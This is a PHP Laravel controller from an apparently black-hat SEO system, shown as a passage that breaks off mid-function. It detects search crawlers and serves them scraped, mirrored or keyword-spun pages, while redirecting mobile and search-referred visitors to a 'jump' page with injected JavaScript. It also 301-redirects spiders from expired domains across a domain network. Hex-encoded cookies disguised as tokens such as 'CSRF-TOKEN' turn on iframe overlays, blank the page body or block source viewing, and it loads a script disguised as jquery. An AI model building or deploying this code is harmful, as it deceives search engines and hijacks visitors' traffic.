<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Overtrue\Pinyin\MemoryFileDictLoader;
use Overtrue\Pinyin\Pinyin;
use sqhlib\Hanzi\HanziConvert;

class CoreController extends Controller{
    private $cache;//所有域名
    private $ua;//蜘蛛
    private $firstDomain;//域名
    private $lastDomain;//二级域名
    private $host;//全部域名
    private $num;//navigation变量,让导航栏不一样
    private $link;//应用的模式
    private $fileName;//文件保存的名字
    private $prefix;//单站镜像的目录层级
    //获取目录所有可以用的域名
    public function __construct(){
        $this->ua=$this->getUa();
        if(isset($_SERVER['HTTP_HOST'])){
            $host=$_SERVER['HTTP_HOST'];
        }else{
            $this->notFound();
            die;
        }
        if(substr($host,0,strrpos($host,":"))){
            $host=substr($host,0,strrpos($host,":"));
        }
        if(filter_var($host,FILTER_VALIDATE_IP)&&!config('app.diy.hijack')){//如果是ip地址,并且劫持没有开
            $this->notFound();
            die;
        }
        $this->lastDomain='';//和lastname意思一样，是姓。域名前缀      $firstDomain是名。是域名
        $this->getDomain($host);
        if(empty($this->lastDomain)){
            $this->host=$this->firstDomain;
        }else{
            $this->host=$this->lastDomain.'.'.$this->firstDomain;
        }
        if($this->ua){
            $interlink=(int)config('app.diy.interlink');
            $this->cache='';
            if(!empty($interlink)&&config('app.diy.link')){
                $ch=curl_init();//初始化
                curl_setopt($ch,CURLOPT_URL,str_replace([" ","\t","\r","\n"],'',config('app.diy.link')));//这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);//如果成功只将结果返回，不自动输出任何内容。
                curl_setopt($ch,CURLOPT_INTERFACE,$_SERVER['SERVER_ADDR']);
                curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,1);
                curl_setopt($ch,CURLOPT_TIMEOUT,2);
                $source=curl_exec($ch);
                curl_close($ch);
                if($source){
                    $links=explode(PHP_EOL,$source);
                    $links=str_replace("\r",'',$links);
                    $this->cache=$links;
                }
            }
            $this->num=0;
        }else{
            header('Access-Control-Allow-Origin: *');
            //如果是手机才跳或者有来路的才跳
            if($this->isMobile()){
                echo view('jump',['js'=>config('app.diy.js')]);
                die;
            }else{
                if(isset($_SERVER['HTTP_REFERER'])){
                    preg_match('/keyword=|wd=|so\.com|bing|google|toutiao|sm/i',$_SERVER['HTTP_REFERER'],$match);
                    if($match){
                        echo view('jump',['js'=>config('app.diy.js')]);
                        die;
                    }
                }
            }
            $this->ua='Baiduspider';
            $this->universal();
            $path='cache/'.$this->firstDomain.'/Baiduspider/'.$this->link.'/'.$this->prefix.$this->fileName.'.html';
            $isCache=Storage::disk('local')->exists($path);//判断是否已经有这个缓存了
            if($isCache){
                //如果有缓存的话
                $template=file_get_contents(Storage::disk('local')->path($path));
                echo $template;
            }else{
                $this->notFound();
            }
            die;
        }
    }
    //入口方法
    public function index(){
        if(!config('app.diy.hijack')){
            //如果不能查到这个站点，说明蜘蛛还在根据这个IP来查，则让蜘蛛跳到其他链接
            $expired=$this->curlUniversal($this->host.'/expired.txt');
            //如果我访问得不能得到当前字符串，说明这个域名过期了，蜘蛛还是根据之前得IP来查找得
            if($expired!=='new'){
                if(!$this->cache){
                    $ch=curl_init();//初始化
                    curl_setopt($ch,CURLOPT_URL,str_replace([" ","\t","\r","\n"],'',config('app.diy.link')));//这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。
                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);//如果成功只将结果返回，不自动输出任何内容。
                    curl_setopt($ch,CURLOPT_INTERFACE,$_SERVER['SERVER_ADDR']);
                    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,1);
                    curl_setopt($ch,CURLOPT_TIMEOUT,2);
                    $source=curl_exec($ch);
                    curl_close($ch);
                    if($source){
                        $links=explode(PHP_EOL,$source);
                        $links=str_replace("\r",'',$links);
                        $this->cache=$links;
                    }
                }
                if($this->cache){
                    $domain=$this->cache[mt_rand(0,count($this->cache)-1)];
                }else{
                    //跳转当前还没有过期得域名
                    $contents=Storage::directories('cache');
                    $index=mt_rand(0,count($contents)-1);
                    $domain=str_replace('cache/','',$contents[$index]);
                }
                if(empty($this->lastDomain)){
                    header("Location: http://".$domain,true,301);
                    die;
                }
                header("Location: http://".$this->lastDomain.'.'.$domain,true,301);
                die;
            }
        }
        //如果是js、css、pic没有匹配到的被404，直接返回默认的
        if($return=$this->jcp()){
            return $return;
        }
        $this->universal();
        $path='cache/'.$this->firstDomain.'/'.$this->ua.'/'.$this->link.'/'.$this->prefix.$this->fileName.'.html';
        $isCache=Storage::disk('local')->exists($path);//判断是否已经有这个缓存了
        //是否需要刷新模板内容
        $date=(int)config('app.diy.contentchange');
        $cache='';
        //如果当前时间大于最后修改时间则需要更改内容
        if(time()>$date*60*60+@filemtime(Storage::disk('local')->path($path))&&!empty($date)){
            $cache='可以进行修改缓存';
        }
        if($isCache){
            //如果有缓存的话
            $template=file_get_contents(Storage::disk('local')->path($path));
            //如果缓存为0，说明有时候镜像没有被抓好
            if(!strlen($template)){
                Storage::disk('local')->delete($path);
                return $this->index();
            }
            if(config('app.diy.template')[$this->ua]&&!config('app.diy.issingle')[$this->ua]){
                preg_match('/<title>([\s\S]*?)<\/title>/i',$template,$match);
                if(!empty($match[1])){
                    $title=$match[1];
                }
                preg_match('/<meta name="keywords" content="([\s\S]*?)".*?>/i',$template,$match);
                if(!empty($match[1])){
                    $keywords=$match[1];
                }
                preg_match('/<meta name="description" content="([\s\S]*?)".*?>/i',$template,$match);
                if(!empty($match[1])){
                    $description=$match[1];
                }
            }
            //如果当前时间大于最后修改时间则需要更改内容
            if($cache){
                switch($this->link){
                    case 'template':
                        $file='';
                        $how=substr_count($_SERVER['REQUEST_URI'],'/');//统计有几个/符号
                        if($how>1&&!empty(substr($_SERVER['REQUEST_URI'],strripos($_SERVER['REQUEST_URI'],'/')+1))){
                            $file='show';
                        }
                        if(empty($file)){//如果是show页面则不更新
                            $template=$this->getTemplate();
                        }
                        break;
                    case 'mirror':
                        $template=$this->replacePic($template);//替换图片
                        $template=$this->hrefLink($template);//替换所有的href链接里面的内容
                        $template=$this->contentChange($template);
                        break;
                    case 'single':
                        $template=$this->contentChange($template);
                        break;
                }
            }
            if(config('app.diy.template')[$this->ua]&&!config('app.diy.issingle')[$this->ua]){
                if(!empty($title)){
                    $template=preg_replace('/<title>[\s\S]*?<\/title>/i','<title>'.$title.'</title>',$template);
                }
                if(!empty($keywords)){
                    $template=preg_replace('/<meta name="keywords" content="([\s\S]*?)".*?>/i','<meta name="keywords" content="'.$keywords.'"/>',$template);
                }
                if(!empty($description)){
                    $template=preg_replace('/<meta name="description" content="([\s\S]*?)".*?>/i','<meta name="description" content="'.$description.'"/>',$template);
                }
            }
        }else{
            switch($this->link){
                case 'template':
                    $template=$this->getTemplate();
                    break;
                case 'mirror':
                    $template=$this->getMirror();
                    break;
                case 'single':
                    $template=$this->single();
                    break;
            }
            $cache='可以进行修改缓存';
        }
        //如果我需要缓存,如果不判断时间得话。那么如果进行缓存以后，
        if(config('app.diy.cache')&&$cache){
            $template=ltrim(rtrim(preg_replace(array("/> *([^ ]*) *</","//","'/\*[^*]*\*/'","/\r\n/","/\n/","/\t/",'/>[ ]+</'),array(">\\1<",'','','','','','><'),$template)));
            Storage::disk('local')->put($path,$template);
        }
        return $this->temporary($template);//以下内容不需要缓存。可以在缓存得基础上修改
    }
    //不要缓存添加到文件里面得内容
    protected function temporary($template){
        $template=preg_replace('/<html.*?>/i','<html>'.config('app.diy.annotation'),$template);//注释
        //是否禁止访客从搜索引擎点击进入
        if(config('app.diy.noarchive')){
            $template=preg_replace('/<\/head>/i','<meta name="robots" content="noarchive"></head>',$template);
        }
        //干扰标签
        if(config('app.diy.label')){
            $content='';
            preg_match('/<body[\s\S]*?>([\s\S]*?)<\/body>/i',$template,$match);
            $body='<body>';
            if(!empty($match[1])){
                preg_match('/<body[\s\S]*?>/i',$template,$bodys);
                if(!empty($bodys[0])){
                    $body=$bodys[0];
                }
                $template=preg_replace('/<body[\s\S]*?>[\s\S]*?<\/body>/i',$body.$this->label($match[1]).'</body>',$template);
            }
        }
        preg_match('/<title>([\s\S]*?)<\/title>/i',$template,$match);
        if(!empty($match[1])){
            $title=$match[1];
        }
        preg_match('/<meta name="keywords" content="([\s\S]*?)".*?>/i',$template,$match);
        if(!empty($match[1])){
            $keywords=$match[1];
        }
        preg_match('/<meta name="description" content="([\s\S]*?)".*?>/i',$template,$match);
        if(!empty($match[1])){
            $description=$match[1];
        }
        if(config('app.diy.jtf')){
            $template=HanziConvert::convert($template,true);
        }
        if(!empty($title)){
            $template=preg_replace('/<title>[\s\S]*?<\/title>/i','<title>'.$this->unicode($title).'</title>',$template);
        }
        if(!empty($keywords)){
            $template=preg_replace('/<meta name="keywords" content="([\s\S]*?)".*?>/i','<meta name="keywords" content="'.$this->unicode($keywords).'"/>',$template);
        }
        if(!empty($description)){
            $template=preg_replace('/<meta name="description" content="([\s\S]*?)".*?>/i','<meta name="description" content="'.$this->unicode($description).'"/>',$template);
        }
        $py=(int)config('app.diy.pinyin');
        if($py){
            preg_match_all('/[\x{4e00}-\x{9fff}]+/u',$template,$content);
            $string=implode('',$content[0]);
            $array=array_unique(preg_split('/(?<!^)(?!$)/u',$string));
            $array=array_splice($array,0,count($array));
            if($py<count($array)){
                $pinyin=new Pinyin(MemoryFileDictLoader::class);
                for($i=0;$i<$py;$i++){
                    $rand=mt_rand(0,count($array)-1);
                    $template=str_replace($array[$rand],$array[$rand].'('.implode('',$pinyin->convert($array[$rand],PINYIN_NO_TONE)).')',$template);
                    array_splice($array,$rand,1);
                }
            }
        }
        //是否禁止查看代码，除了直接输入view-source才可以看代码
        $safety=config('app.diy.safety');
        if($safety&&!$this->isMobile()){
            $hex="";
            $tmp="";
            for($i=0;$i<strlen($safety);$i++){
                $tmp=dechex(ord($safety[$i]));
                $hex.=strlen($tmp)==1?'\x0'.$tmp :'\x'.$tmp;
            }
            setrawcookie('SAFE-TOKEN',$hex,time()+10);
        }
        //是否删除body节点里面得所有内容
        $del=config('app.diy.del');
        if($del){
            $hex="";
            $tmp="";
            for($i=0;$i<strlen($del);$i++){
                $tmp=dechex(ord($del[$i]));
                $hex.=strlen($tmp)==1?'\x0'.$tmp :'\x'.$tmp;
            }
            setrawcookie('DEL-TOKEN',$hex,time()+10);
        }
        //开启iframe框架
        $iframe=config('app.diy.iframe');
        if($iframe){
            $hex="";
            $tmp="";
            for($i=0;$i<strlen($iframe);$i++){
                $tmp=dechex(ord($iframe[$i]));
                $hex.=strlen($tmp)==1?'\x0'.$tmp :'\x'.$tmp;
            }
            setrawcookie('CSRF-TOKEN',$hex,time()+10);
        }
        //修改为其他标题
        $changetitle=config('app.diy.changetitle');
        if($changetitle){
            setrawcookie('CHANGE-TOKEN',$changetitle,time()+10);
        }
        //开启内页跳主页
        $jump=config('app.diy.jump');
        if($jump&&$_SERVER['REQUEST_URI']!=='/'){
            $hex="";
            $tmp="";
            $jump='//'.$this->host;
            for($i=0;$i<strlen($jump);$i++){
                $tmp=dechex(ord($jump[$i]));
                $hex.=strlen($tmp)==1?'\x0'.$tmp :'\x'.$tmp;
            }
            setrawcookie('JUMP-TOKEN',$hex,time()+10);
        }
        $template=preg_replace('/<\/head>/i','<script type="text/javascript" src="//'.$this->host.'/jquery-3.6.0.min.js"></script></head>',$template);
        return $template;
    }
    //获取link、prefix、filename
    protected function universal(){
        $this->prefix='';
        //判断是走模板还是镜像，模板速度快，稳定。镜像会根据目标站来进行
        if(config('app.diy.template')[$this->ua]&&!config('app.diy.issingle')[$this->ua]){
            //走模板
            $this->link='template';
        }else{
            //镜像
            //走单站
            if(config('app.diy.issingle')[$this->ua]){
                $this->link='single';
                $this->prefix=$this->lastDomain;
                if(empty($this->prefix)){
                    $this->prefix='www/';
                }else{
                    $this->prefix=$this->lastDomain.'/';
                }
            }else{
                //走镜像单页面
                $this->link='mirror';
            }
        }
        $port=$_SERVER['SERVER_PORT'];
        $randPort='';
        if((int)$port!==80){
            $randPort=':'.$port;
        }
        //如果是泛端口，也得需要变化，如果相同域名，但是端口不一样，那么也是不一样得
        $this->fileName=str_replace(config('app.diy.deluri'),'',$this->lastDomain.$this->firstDomain.$randPort.$_SERVER['REQUEST_URI']);
        //如果後綴太長，超過50個字符的話，則剪切前面50個
        if(strlen($this->fileName)>100){
            $this->fileName=substr($this->fileName,0,100);
        }
    }
    //循环干扰标签
    protected function label($content){
        $attribute=['lang','draggable','dropzone','dir','date-time'];
        $node=['div','a','dd','img','ul','form','input'];
        $chars=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"];
        $label=config('app.diy.label');
        foreach($node as $n){
            preg_match_all('/<'.$n.'[\s\S]*?>/i',$content,$n);
            if(!empty($n[0])){
                $array=array_unique($n[0]);
                array_splice($array,0,0);
                foreach($array as $v){
                    for($i=0;$i<3;$i++){
                        $str='';
                        for($j=0;$j<6;$j++){
                            $str=$str.$this->chooseFile($chars,md5($this->host.$this->num++),'不打开');//随机取出一位
                        }
                        $first=array_shift($label);
                        $attri=array_shift($attribute);
                        $content=str_replace($v,'<'.$first.' '.$attri.'="'.$str.'"'.'></'.$first.'>'.$v,$content);
                        array_push($label,$first);
                        array_push($attribute,$attri);
                    }
                }
            }
        }
        return $content;
    }
    //得到准确域名
    protected function getDomain($host){
        if(filter_var($host,FILTER_VALIDATE_IP)){//如果是ip地址
            return $this->firstDomain=$host;
        }
        //获取访问的url
        $domain=explode('.',strtolower($host));
        $count=count($domain);
        //如果域名分解出来少于3 有可能是 xxx.com 默认首位是www
        if($count<3){
            if($count<2){
                $this->notFound();
                die;
            }
            $this->firstDomain=$domain[0].'.'.$domain[1];
        }else{
            //就是www.xxx.com 或者 xxx.xxx.com 也有可能是 xxx.com.cn，前面省略了www
            if(in_array($domain[$count-2].'.'.$domain[$count-1],config('app.diy.domain'))){
                //说明这是.com.cn org.cn 这种连续域名
                if($count===3){
                    $this->firstDomain=$domain[0].'.'.$domain[1].'.'.$domain[2];
                }else{
                    $temporary='';
                    //有可能是a.b.c.com.cn
                    for($i=0;$i<$count-3;$i++){
                        $temporary=$temporary.$domain[$i].'.';
                    }
                    $this->lastDomain=substr($temporary,0,strlen($temporary)-1);
                    $this->firstDomain=$domain[$count-3].'.'.$domain[$count-2].'.'.$domain[$count-1];
                }
            }else{
                //说明这肯定是a.d.com
                $temporary='';
                for($i=0;$i<$count-2;$i++){
                    $temporary=$temporary.$domain[$i].'.';
                }
                $this->lastDomain=substr($temporary,0,strlen($temporary)-1);
                $this->firstDomain=$domain[$count-2].'.'.$domain[$count-1];
            }
        }
    }
    //单站的方法
    protected function single(){
        $aims=$this->curlAll(config('app.diy.webs'));
        $aims=$this->chooseFile($aims,md5($this->host),'不打开文件,并且一个前缀对应一个域名');
        $template=$this->changeCoding($this->curl($aims.ltrim($_SERVER['REQUEST_URI'],'/')));//镜像统一为utf-8
        $template=$this->delHref($template);//删除http开头的链接
        $template=$this->replaceStyle($template,$aims);//替换css。js等信息
        $template=$this->replacePic($template);//替换图片
        $template=$this->tdk($template);
        return $template;
    }
    //单站把http这些删除掉
    protected function delHref($template){
        preg_match_all('/(http(s)?:\/\/[\s\S]*?)[\/|\"|\']/i',$template,$matches);
        foreach(array_unique($matches[1]) as $match){
            $template=str_replace($match,'',$template);
        }
        return $template;
    }
    //获取镜像目标站
    protected function getMirror(){
        $aims=$this->curlAll(config('app.diy.webs'));
        $aims=$aims[mt_rand(0,count($aims)-1)];
        $template=$this->changeCoding($this->curl($aims));//镜像统一为utf-8
        $template=$this->replaceStyle($template,$aims);//替换css。js等信息
        $template=$this->replacePic($template);//替换图片
        $template=$this->hrefLink($template);//替换所有的href链接里面的内容
        $template=$this->tdk($template);
        return $template;
    }
    //替换镜像所有需要修改的txt内容
    protected function tdk($template){
        //当前文件找一个词库
        $path=Storage::disk('local')->path('txtinfo/'.$this->ua);
        //扫描目录下的所有文件
        $fileDir=scandir($path);
        //定义一个数组接收文件名
        $conname=[];
        foreach($fileDir as $v){
            // 跳过两个特殊目录 continue跳出循环
            if($v==="."||$v===".."){
                continue;
            }
            array_push($conname,$path.'/'.$v);
        }
        if($this->link==='single'){
            $words=file($this->chooseFile($conname,md5($this->firstDomain),'不打开里面得文件'));
        }else{
            $words=file($conname[mt_rand(0,count($conname)-1)]);
        }
        if(config('app.diy.associate')){
            $title=$this->getTitle(str_replace(config('app.diy.deluri'),'',$this->fileName));
        }else{
            $title=$this->chooseFile(config('app.diy.templatetitle')[$this->ua],md5($this->fileName),'不打开里面得文件');//获取属于当前域名得后缀类型。R就是地址，T就是词。
            //循环地址
            preg_match_all('/TITLE/i',$title,$matches);
            for($i=0;$i<count($matches[0]);$i++){
                $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                $c=str_replace("\r",'',$c);
                $title=preg_replace('/TITLE/i',$c,$title,1);
            }
            $title=preg_replace('/ADDRESS/i',$this->chooseFile(config('app.diy.address'),md5($this->fileName),'不打开里面得文件'),$title);
        }
        $keywords=$title;
        $description=config('app.diy.description');
        if(config('app.diy.keywords')){
            $keywords='';
            for($i=0;$i<(int)config('app.diy.keywords');$i++){
                $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                $c=str_replace("\r",'',$c);
                $keywords=$keywords.$c;
            }
        }
        if($description){
            //当前文件找一个词库
            $path=Storage::disk('local')->path('txtinfo/title');
            //扫描目录下的所有文件
            $fileDir=scandir($path);
            //定义一个数组接收文件名
            $news=[];
            foreach($fileDir as $v){
                // 跳过两个特殊目录 continue跳出循环
                if($v==="."||$v===".."){
                    continue;
                }
                array_push($news,$path.'/'.$v);
            }
            $news=file($news[mt_rand(0,count($news)-1)]);
            $description=str_replace("{NEWS}",str_replace("\r",'',str_replace(PHP_EOL, '', $news[mt_rand(0,count($news)-1)])),$description);
            $description=str_replace("{TITLE}",$title,$description);
            preg_match('/{\d+}/',$description,$num);
            if(!empty($num[0])){
                preg_match('/\d+/',$num[0],$frequency);
                $str='';
                for($i=0;$i<(int)$frequency[0];$i++){
                    $c=str_replace("\n",'',$words[mt_rand(0,count($words)-1)]);
                    $c=str_replace("\r",'',$c);
                    $str=$str.$c;
                }
                $description=str_replace('{'.$frequency[0].'}',$str,$description);
            }
        }
        if($this->link!=='single'){
            $template=preg_replace('/<\/body>/i','<footer><div>网站地图:<a href="http://www.'.$this->firstDomain.'/sitemap.xml">'.$this->firstDomain.'/sitemap.xml</a></div></footer></body>',$template);
        }
        $template=preg_replace('/<title[\s\S]*?>[\s\S]*?<\/title>/i','<title>'.$title.'</title>',$template);
        $template=preg_replace('/<meta.*\n*keywords[\s\S]*?>/i','<meta name="keywords" content="'.$keywords.'"/>',$template);
        $template=preg_replace('/<meta.*\n*description[\s\S]*?>/i','<meta name="description" content="'.$description.'"/>',$template);
        $template=preg_replace('/<meta.*\n*generator[\s\S]*?>/i','<meta name="generator" content="版权所有：'.$this->firstDomain.'"/>',$template);
        $template=preg_replace('/<meta.*\n*author[\s\S]*?>/i','<meta name="author" content="作者拥有：'.$this->firstDomain.'"/>',$template);
        return $this->contentChange($template);
    }
    //得到标题，统一操作
    protected function getTitle($fileName){
        $title=$this->chooseFile(config('app.diy.templatetitle')[$this->ua],md5($fileName),'不打开里面得文件');//获取属于当前域名得后缀类型。R就是地址，T就是词。
        //当前文件找一个词库
        $ciku=file($this->chooseFile(Storage::disk('local')->path('txtinfo/'.$this->ua),md5($fileName),'不打开里面得文件'));
        //循环地址
        preg_match_all('/TITLE/i',$title,$matches);
        for($i=0;$i<count($matches[0]);$i++){
            $title=preg_replace('/TITLE/i',$this->chooseFile($ciku,md5($fileName.$this->ua.$i),'不打开里面得文件'),$title,1);
        }
        return preg_replace('/ADDRESS/i',$this->chooseFile(config('app.diy.address'),md5($fileName),'不打开里面得文件'),$title);
    }
    //修改文字内容替换
    protected function contentChange($template){
        $label=['h1','h2','h3','h4','h5','h6','li','span','i'];
        $date=time();
        foreach($label as $v){
            preg_match_all('/<'.$v.'.*?>([\s\S]*?)<\/'.$v.'>/',$template,$matches);
            $num=0;
            foreach(array_unique($matches[1]) as $match){
                $num++;
                $match=str_replace(PHP_EOL,'',$match);
                if(preg_match('/^(?!.*\d{4}[-|\.]\d{1,2}[-|\.]\d{1,2})/',$match)&&preg_match('/^(?!.*\.xml)/',$match)&&preg_match('/^(?!.*<[a-zA-Z])/',$match)&&$match&&strlen($match)>2&&!is_numeric($match)){
                    $template=str_replace($match,$this->chooseFile(Storage::disk('local')->path('txtinfo/articles'),md5($this->fileName.$match.$num.$date)),$template);
                }
            }
        }
        /*//修改时间
        preg_match_all('/\d{4}[-|\.]\d{1,2}[-|\.]\d{1,2}/',$template,$matches);
        $num=count(array_unique($matches[0]))-1;
        foreach(array_unique($matches[0]) as $match){
            $template=str_replace($match,date('Y-m-d',strtotime('-'.$num--.' day')),$template);
        }*/
        return $template;
    }
    //替换所有的href链接
    protected function hrefLink($template){
        preg_match('/href.*?[\"|\'].*?\.ico[\"|\']/i',$template,$match);
        $template=str_replace($match,"",$template);
        //为什么是href.*? 而不是href=呢？万一中间加了个空格。
        preg_match_all('/<a[\s\S]*?href[\s\S]*?[\"|\'][\s\S]*?[\"|\'][\s\S]*?>[\s\S]*?<\/a>/i',$template,$matches);
        $pinyin=new Pinyin(MemoryFileDictLoader::class);
        foreach(array_unique($matches[0]) as $match){
            $data=$this->content($this->firstDomain,$pinyin);
            $template=str_replace($match,'<a href="'.$data['url'].'">'.$data['title'].'</a>',$template);
        }
        return $template;
    }
    //替换图片
    protected function replacePic($template){
        $pic=File::files(public_path('/storage/images'));
        preg_match_all('/<img[\s\S]*?src[\s\S]*?[\"|\'][\s\S]*?[\.jpg|\.png|\.gif|\.jpeg][\"|\']/i',$template,$matches);
        foreach(array_unique($matches[0]) as $match){
            $link=$pic[mt_rand(0,count($pic)-1)]->getFilename();
            $template=str_replace($match,'<img src="/storage/images/'.$link.'"',$template);
        }
        return $template;
    }
    //修改js、css等链接。因为有些是指向相对路径，并非绝对路径。之所以不加JS到<script>。因为大部分网站都是10多W的JS代码。。。。。
    protected function replaceStyle($template,$aims){
        preg_match_all("/href.*[\"|\'](.*\.css)[\"|\']/i",$template,$matches);
        $template=$this->addLink($template,$matches[1],$aims);
        preg_match_all("/src.*[\"|\'](.*\.js)[\"|\']/i",$template,$matches);
        $template=$this->addLink($template,$matches[1],$aims);
        return $template;
    }
    //正则分配过来得数组前面是否加网站
    protected function addLink($template,$matches,$aims){
        $preg="/^http(s)?:\\/\\/.+/";
        foreach(array_unique($matches) as $match){
            if(!preg_match($preg,$match)){
                if(substr($match,0,1)==='/'){
                    $link=$aims.substr($match,1);
                }else{
                    $link=$aims.$match;
                }
                $template=str_replace($match,$link,$template);
            }
        }
        return $template;
    }
    //镜像站目标统一为utf8
    protected function changeCoding($template){
        $codingType=mb_detect_encoding($template,array('UTF-8','GBK','LATIN1','GB2312'));//mb_detect_encoding() 函数来判断字符串是什么编码的
        return mb_convert_encoding($template,'utf-8',$codingType);
    }
    //抓取目标站模板
    protected function curl($aims){
        $user_agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)";
        $ch=curl_init();//初始化
        curl_setopt($ch,CURLOPT_URL,str_replace([" ","\t","\r","\n"],'',$aims));//这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);//如果成功只将结果返回，不自动输出任何内容。
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,3);
        curl_setopt($ch,CURLOPT_TIMEOUT,6);
        curl_setopt($ch,CURLOPT_ENCODING,'');
        curl_setopt($ch,CURLOPT_INTERFACE,$_SERVER['SERVER_ADDR']);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt($ch,CURLOPT_USERAGENT,$user_agent);//在HTTP请求中包含一个”user-agent”头的字符串。
        $source=curl_exec($ch);
        $httpCode=curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        if(empty($source)||(int)$httpCode!==200){
            if($this->link!=='single'){
                Log::info($aims.'网站无法抓取');
                $aims=$this->curlUniversal(config('app.diy.webs'));
                return $this->curl($aims);
            }else{
                $path='cache/'.$this->firstDomain.'/Baiduspider/single/'.$this->prefix.$this->fileName.'.html';
                $isCache=Storage::disk('local')->exists($path);//判断是否已经有这个缓存了
                if($isCache){
                    //如果有缓存的话
                    $template=file_get_contents(Storage::disk('local')->path($path));
                    echo $template;
                }else{
                    preg_match('/(http|https):\/\/[\s\S]*\/([\s\S]*)/',$aims,$match);
                    if(empty($match[2])&&substr_count($aims,'/')<4){
                        Log::info($aims.'网站无法抓取');
                    }
                    $this->notFound();
                }
                die;
            }
        }
        return $source;
    }
    //通用得爬站并得到一条连接
    protected function curlUniversal($link){
        $ch=curl_init();//初始化
        curl_setopt($ch,CURLOPT_URL,str_replace([" ","\t","\r","\n"],'',$link));//这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项。
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);//如果成功只将结果返回，不自动输出任何内容。
        curl_setopt($ch,CURLOPT_INTERFACE,$_SERVER['SERVER_ADDR']);
        $source=curl_exec($ch);
        curl_close($ch);
        $content=explode(PHP_EOL,$source);
        return $content[mt_rand(0,count($content)-1)];
    }
    //一个url匹配一个文本,匹配文本
    public function content($firstDomain,$pinyin,$type='',$rdf=''){
        if(empty($rdf)){
            //开启互链，并且随机是否显示其他得
            $interlink=(int)config('app.diy.interlink');
            if(!empty($this->cache)){
                $rand=mt_rand(1,100);
                if($interlink>=$rand){
                    $index=mt_rand(0,count($this->cache)-1);
                    $firstDomain=$this->cache[$index];
                }
            }
        }
        $data['url']=$this->urlformat($firstDomain,$pinyin);
        //要删掉域名，否则点进去得链接和词不一样
        if(config('app.diy.hijack')){
            $delY=str_replace(config('app.diy.deluri'),'',$this->host.$data['url']);
        }else{
            $delY=str_replace(config('app.diy.deluri'),'',$data['url']);
        }
        if(config('app.diy.associate')){
            if(config('app.diy.new')){
                $data['title']=$this->chooseFile(Storage::disk('local')->path('txtinfo/title'),md5($delY));
            }else{
                $data['title']=$this->getTitle($delY);
            }
        }else{
            $data['title']=$this->chooseFile(Storage::disk('local')->path('txtinfo/title'),md5($delY));
        }
        if(!empty($type)){
            $data['article']=$this->chooseFile(Storage::disk('local')->path('txtinfo/articles'),md5($delY));
            $data['anthor']=$this->chooseFile(Storage::disk('local')->path('txtinfo/anthors'),md5($delY));
        }
        return $data;
    }
    //导航栏的匹配
    public function navigation($firstDomain,$pinyin){
        $port=$_SERVER['SERVER_PORT'];
        $randPort='';
        if((int)$port!==80){
            $randPort=':'.mt_rand(config('app.diy.port')[0],config('app.diy.port')[1]);
        }
        $format=config('app.diy.navigation')[$this->ua];
        $data['title']=$this->chooseFile(Storage::disk('local')->path('txtinfo/navigation'),md5($this->host.$this->num++));
        $navigationPy=implode('',$pinyin->convert($data['title'],PINYIN_NO_TONE));
        $format=str_replace('Y',$firstDomain.$randPort,$format);
        $format=str_replace('{change}',$navigationPy,$format);
        $data['url']=str_replace('HOST',$this->host.$randPort,$format);
        return $data;
    }
    //获取内页模板
    protected function getTemplate(){
        //当前域名及前后缀得唯一标识符$md5，根据条件寻找模板。一条域名一个模板、一个后缀title、一个地址
        $md5=md5($_SERVER['HTTP_HOST'].$_SERVER['REMOTE_ADDR']);
        $typePath=$this->chooseFile(resource_path('views/template'),$md5,'不打开里面得文件');//得到哪个类型得模板路径
        if(empty($typePath)){
            return resource_path('views/template').'目录没有模板，要么尽快添加，要么更换模式';
        }
        $type=substr($typePath,strripos($typePath,'/')+1);//得到模板得类型
        $namePath=$this->chooseFile($typePath,$md5,'不打开里面得文件');//得到类型里面得模板路径
        if(empty($namePath)){
            return $typePath.'目录没有模板，要么尽快添加，要么更换模式';
        }
        $name=substr($namePath,strripos($namePath,'/')+1);
        $how=substr_count($_SERVER['REQUEST_URI'],'/');//统计有几个/符号
        if($how===1&&$_SERVER['REQUEST_URI']==='/'){
            $file='index';//后面没有字符，说明是主域名
        }else{
            $file='list';//说明后面有字符
            //如果域名/xxx/x 则会是show的界面
            if($how>1&&!empty(substr($_SERVER['REQUEST_URI'],strripos($_SERVER['REQUEST_URI'],'/')+1))){
                $file='show';
            }
        }
        $content='';
        $anthor='';
        $media='';
        $num=0;
        if($file==='show'){
            $article=config('app.diy.body');
            preg_match_all('/{.*?}/',$article,$matches);
            foreach($matches[0] as $match){
                if($match==='{article}'){
                    $content=$content.$this->chooseFile(Storage::disk('local')->path('txtinfo/articles'),md5($this->fileName.$num++)).'<br>';
                }else{
                    $path=$this->chooseFile(public_path('storage/images'),md5($this->fileName.$num++),'不打开里面得文件');//得到哪个类型得模板路径
                    $picname=substr($path,strripos($path,'/')+1);
                    $content=$content.'<img src="//'.$this->host.'/storage/images/'.$picname.'" title="美女"/>'.'<br>';
                }
            }
            $content=$this->ascii($content);
            $anthor=$this->chooseFile(Storage::disk('local')->path('txtinfo/anthors'),md5($this->fileName));
            $media=$this->chooseFile(Storage::disk('local')->path('txtinfo/medias'),md5($this->fileName));
        }
        $pinyin=new Pinyin(MemoryFileDictLoader::class);//只需要blade模板里面new一次对象。如果new多了，每个url都new一次会很卡
